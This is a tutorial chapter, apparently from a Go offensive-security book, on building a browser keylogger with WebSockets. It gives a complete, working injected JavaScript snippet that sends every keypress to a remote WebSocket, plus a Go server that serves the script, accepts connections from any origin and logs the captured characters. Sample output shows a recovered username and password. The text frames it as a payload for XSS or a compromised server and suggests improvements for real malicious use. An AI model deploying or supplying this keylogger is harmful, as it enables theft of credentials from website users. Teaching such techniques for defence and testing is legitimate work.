## Keylogging With The Websocket API
The [WebSocket API (WebSockets)](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API), a full duplex protocol, 
has increased in popularity over the years and many browsers now support it. It provides a way for web application 
servers and clients to efficiently communicate with each other. Most importantly, it allows the server to send 
messages to a client without the need for polling.

The WebSocket API is an advanced technology that makes it possible to open a two-way interactive communication session 
between the user's browser and a server. With this API, you can send messages to a server and receive event-driven 
responses without having to poll the server for a reply.

> **NOTE**  
> While a WebSocket connection is functionally somewhat similar to standard Unix-style sockets, they are not related.

WebSockets are useful for building “real-time” applications, such as chat and games, but you can use them for nefarious 
purposes as well, such as injecting a keylogger into an application to capture every key a user presses. 
To begin, imagine you’ve identified an application that is vulnerable to [cross-site scripting](https://owasp.org/www-community/attacks/xss/) 
(a flaw through which a third party can run arbitrary JavaScript in a victim’s browser) or you’ve compromised a web 
server, allowing you to modify the application source code. Either scenario should let you include a remote 
JavaScript file. You’ll build the server infrastructure to handle a WebSocket connection from a client and handle 
incoming keystrokes.

> **WHAT IS XSS?**  
> Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise 
> benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, 
> generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed 
> are quite widespread and occur anywhere a web application uses input from a user within the output it generates 
> without validating or encoding it.
> 
> An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to 
> know that the script should not be trusted, and will execute the script. Because it thinks the script came from a 
> trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained 
> by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details 
> on the different types of XSS flaws, see: [Types of Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).

For demonstration purposes, you’ll use [JS Bin (http://jsbin.com)](http://jsbin.com) to test your payload. JS Bin is 
an online playground where developers can test their HTML and JavaScript code. Navigate to JS Bin in your web browser 
and paste the following HTML into the column on the left, completely replacing the default code:
```html
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
</head>
<body>
 <script src='http://localhost:8080/k.js'></script>
  <form action='/login' method='post'>
    <input name='username'/>
    <input name='password'/>
    <input type="submit"/>   
  </form>
</body>
</html>
```

On the right side of the screen, you’ll see the rendered form. As you may have noticed, you’ve included a script tag 
with the src attribute set to http://localhost:8080/k.js. This is going to be the JavaScript code that will create 
the WebSocket connection and send user input to the server.

Your server is going to need to do two things: handle the WebSocket and serve the JavaScript file. First, let’s get 
the JavaScript out of the way, since after all, this book is about Go, not JavaScript. (Check out https://github.com/gopherjs/gopherjs/ 
for instructions on writing JavaScript with Go.) The JavaScript code is shown here:
```javascript
(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.onkeypress = keypress;
    function keypress(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();
```

The JavaScript code handles keypress events. Each time a key is pressed, the code sends the keystrokes over a WebSocket 
to a resource at ws://{{.}}/ws. Recall that the {{.}} value is a Go template placeholder representing the current 
context. This resource represents a WebSocket URL that will populate the server location information based on a string 
you’ll pass to the template. We’ll get to that in a minute. For this example, you’ll save the JavaScript in a file 
named logger.js.

But wait, you say, we said we were serving it as k.js! The HTML we showed previously also explicitly uses k.js. What 
gives? Well, logger.js is a Go template, not an actual JavaScript file. You’ll use k.js as your pattern to match against 
in your router. When it matches, your server will render the template stored in the logger.js file, complete with 
contextual data that represents the host to which your WebSocket connects. You can see how this works by looking at the 
server code, shown in [main.go](main.go).
```go
import (
    "flag"
    "fmt"
    "html/template"
    "log"
    "net/http"

    "github.com/gorilla/mux"
 ❶ "github.com/gorilla/websocket"
)

var (
 ❷ upgrader = websocket.Upgrader{
        CheckOrigin: func(r *http.Request) bool { return true },
    }

    listenAddr string
    wsAddr     string
    jsTemplate *template.Template
)

func init() {
    flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
    flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
    flag.Parse()
    var err error
 ❸ jsTemplate, err = template.ParseFiles("logger.js")
    if err != nil {
        panic(err)
    }
}

func serveWS(w http.ResponseWriter, r *http.Request) {
 ❹ conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil {
        http.Error(w, "", 500)
        return
    }
    defer conn.Close()
    fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
    for {
     ❺ _, msg, err := conn.ReadMessage()
        if err != nil {
            return
        }
     ❻ fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
    }
}

func serveFile(w http.ResponseWriter, r *http.Request) {
 ❼ w.Header().Set("Content-Type", "application/javascript")
 ❽ jsTemplate.Execute(w, wsAddr)
}

func main() {
    r := mux.NewRouter()
 ❾ r.HandleFunc("/ws", serveWS)
 ❿ r.HandleFunc("/k.js", serveFile)
    log.Fatal(http.ListenAndServe(":8080", r))
}
```

We have a lot to cover here. First, note that you’re using another third-party package, `gorilla/websocket`, to 
handle your WebSocket communications ❶. This is a full-featured, powerful package that simplifies your development 
process, like the `gorilla/mux` router you used earlier in this chapter. Don’t forget to run `go get github.com/gorilla/websocket` 
from your terminal first.

You then define several variables. You create a `websocket.Upgrader` instance that’ll essentially whitelist every 
origin ❷. It’s typically bad security practice to allow all origins, but in this case, we’ll roll with it since this 
is a test instance we’ll run on our local workstations. For use in an actual malicious deployment, you’d likely want 
to limit the origin to an explicit value.

Within your `init()` function, which executes automatically before `main()`, you define your command line arguments 
and attempt to parse your Go template stored in the `logger.js` file. Notice that you’re calling `template.ParseFiles("logger.js")` ❸. 
You check the response to make sure the file parsed correctly. If all is successful, you have your parsed template stored 
in a variable named `jsTemplate`.

At this point, you haven’t provided any contextual data to your template or executed it. That’ll happen shortly. First, 
however, you define a function named `serveWS()` that you’ll use to handle your WebSocket communications. You create a 
new `websocket.Conn` instance by calling `upgrader.Upgrade(http.ResponseWriter, *http.Request, http.Header)` ❹. The 
`Upgrade()` method upgrades the HTTP connection to use the WebSocket protocol. That means that any request handled 
by this function will be upgraded to use WebSockets. You interact with the connection within an infinite for loop, 
calling `conn.ReadMessage()` to read incoming messages ❺. If your JavaScript works appropriately, these messages 
should consist of captured keystrokes. You write these messages and the client’s remote IP address to stdout ❻.

You’ve tackled arguably the hardest piece of the puzzle in creating your WebSocket handler. Next, you create another 
handler function named `serveFile()`. This function will retrieve and return the contents of your JavaScript template, 
complete with contextual data included. To do this, you set the `Content-Type header as application/javascript` ❼. 
This will tell connecting browsers that the contents of the HTTP response body should be treated as JavaScript. In the 
second and last line of the handler function, you call `jsTemplate.Execute(w, wsAddr)` ❽. Remember how you parsed 
logger.js while you were bootstrapping your server in the init() function? You stored the result within the variable 
named jsTemplate. This line of code processes that template. You pass to it an `io.Writer` (in this case, you’re using 
w, an http.ResponseWriter) and your contextual data of type interface{}. The interface{} type means that you can pass 
any type of variable, whether they’re strings, structs, or something else. In this case, you’re passing a string 
variable named wsAddr. If you jump back up to the init() function, you’ll see that this variable contains the 
address of your WebSocket server and is set via a command line argument. In short, it populates the template with 
data and writes it as an HTTP response. Pretty slick!

You’ve implemented your handler functions, `serveFile()` and `serveWS()`. Now, you just need to configure your 
router to perform pattern matching so that you can pass execution to the appropriate handler. You do this, much as 
you have previously, in your main() function. The first of your two handler functions matches the /ws URL pattern, 
executing your serveWS() function to upgrade and handle WebSocket connections ❾. The second route matches the 
pattern /k.js, executing the serveFile() function as a result ❿. This is how your server pushes a rendered 
JavaScript template to the client.

Let’s fire up the server. If you open the HTML file, you should see a message that reads connection established. 
This is logged because your JavaScript file has been rendered in the browser and requested a WebSocket connection. 
If you enter credentials into the form elements, you should see them printed to stdout on the server:
```shell script
$ go run main.go -listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080
Connection from 127.0.0.1:58438
From 127.0.0.1:58438: u
From 127.0.0.1:58438: s
From 127.0.0.1:58438: e
From 127.0.0.1:58438: r
From 127.0.0.1:58438:
From 127.0.0.1:58438: p
From 127.0.0.1:58438: @
From 127.0.0.1:58438: s
From 127.0.0.1:58438: s
From 127.0.0.1:58438: w
From 127.0.0.1:58438: o
From 127.0.0.1:58438: r
From 127.0.0.1:58438: d
```

You did it! It works! Your output lists each individual keystroke that was pressed when filling out the login form. 
In this case, it’s a set of user credentials. If you’re having issues, make sure you’re supplying accurate addresses 
as command line arguments. Also, the HTML file itself may need tweaking if you’re attempting to call k.js from a 
server other than localhost:8080.

You could improve this code in several ways. For one, you might want to log the output to a file or other persistent 
storage, rather than to your terminal. This would make you less likely to lose your data if the terminal window closes 
or the server reboots. Also, if your keylogger logs the keystrokes of multiple clients simultaneously, the output will 
mix the data, making it potentially difficult to piece together a specific user’s credentials. You could avoid this by 
finding a better presentation format that, for example, groups keystrokes by unique client/port source.

Your journey through credential harvesting is complete. We’ll end this chapter by presenting multiplexing HTTP 
command-and-control connections.